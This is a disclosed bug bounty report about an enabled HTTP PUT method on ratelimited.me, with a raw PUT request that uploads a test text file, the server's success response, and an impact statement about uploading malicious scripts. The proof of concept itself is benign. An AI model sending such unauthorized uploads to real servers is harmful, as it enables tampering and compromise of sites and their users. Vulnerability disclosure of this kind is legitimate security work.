# HTTP PUT method is enabled ratelimited.me

## Report Details
- **Report ID**: 487656
- **URL**: https://hackerone.com/reports/487656
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-01-29T08:30:10.536Z
- **Disclosed**: 2019-01-29T16:09:10.947Z

## Reporter
- **Username**: codeslayer1337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ratelimited

## Vulnerability Information
Found on HTTP PUT sites enabled on web servers. I tried testing to write the file / codelayer137.txt uploaded to the server using the PUT verb, and the contents of the file were then taken using the GET verb. the following is POC

Request:
PUT /codeslayer137.txt HTTP/1.1
Host: ratelimited.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Connection: close
Cookie: __cfduid=dfa5166b2ed63c2a5078df85a46ec5e941548497323; fs_uid=rs.fullstory.com`HCE07`5768820354449408:5743114304094208; cookieconsent_status=dismiss; mp_9e50b60442d3361880f79100f15e5aac_mixpanel=%7B%22distinct_id%22%3A%20%2216889a21237498-0766105008d6a5-12666d4a-e1000-16889a212387c%22%2C%22%24device_id%22%3A%20%2216889a21237498-0766105008d6a5-12666d4a-e1000-16889a212387c%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 27 Jan 2019 00:07:53 GMT
Content-Length: 21

Testing CodeSlayer137


Response:
HTTP/1.1 200 OK
Date: Tue, 29 Jan 2019 08:24:15 GMT
Content-Type: text/plain
Content-Length: 0
Connection: close
Accept-Ranges: bytes
Content-Security-Policy: block-all-mixed-content
Etag: "be3b22647a7d52f2f662109652e629fc"
Vary: Origin
X-Amz-Request-Id: 157E4426C0B3D211
X-Minio-Deployment-Id: ebc7a0d8-9f47-4bdb-92ee-4a9cbbd3ec48
X-Xss-Protection: 1; mode=block
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 4a0a4d20791f31a4-SIN

## Impact

The HTTP PUT method is normally used to upload data that is saved on the server at a user-supplied URL. If enabled, an attacker may be able to place arbitrary, and potentially malicious, content into the application. Depending on the server's configuration, this may lead to compromise of other users (by uploading client-executable scripts), compromise of the server (by uploading server-executable code), or other attacks.

## Attachments
- PUT-.png
- filetxtcode137.png
